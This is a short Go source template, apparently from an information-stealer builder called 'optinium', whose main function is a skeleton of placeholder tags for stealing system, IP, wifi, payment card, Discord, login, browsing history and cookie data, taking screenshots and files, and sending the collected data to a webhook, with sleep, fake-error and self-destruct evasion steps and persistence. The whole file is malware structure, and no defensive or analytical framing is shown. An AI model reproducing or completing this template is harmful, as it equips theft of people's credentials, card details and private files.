package main

import (
	"main/optinium"
	"strings"
)

func main() {
	<SelfDestruct>

	<Sleep>

	<FakeError>

	optinium.InitHook("<WEBHOOK>")
	
	var DATA strings.Builder
	optinium.InitKeys()

	<SystemData>
	<IpData>
	<WifiData>
	<CardData>
	<DiscordData>
	<LoginData>
	<VisitedURLs>
	<CookieData>

	if DATA.String() != "" {
		optinium.SendData(DATA.String())
	}

	<Screenshot>
	<StealFiles>

	<Persist>
}
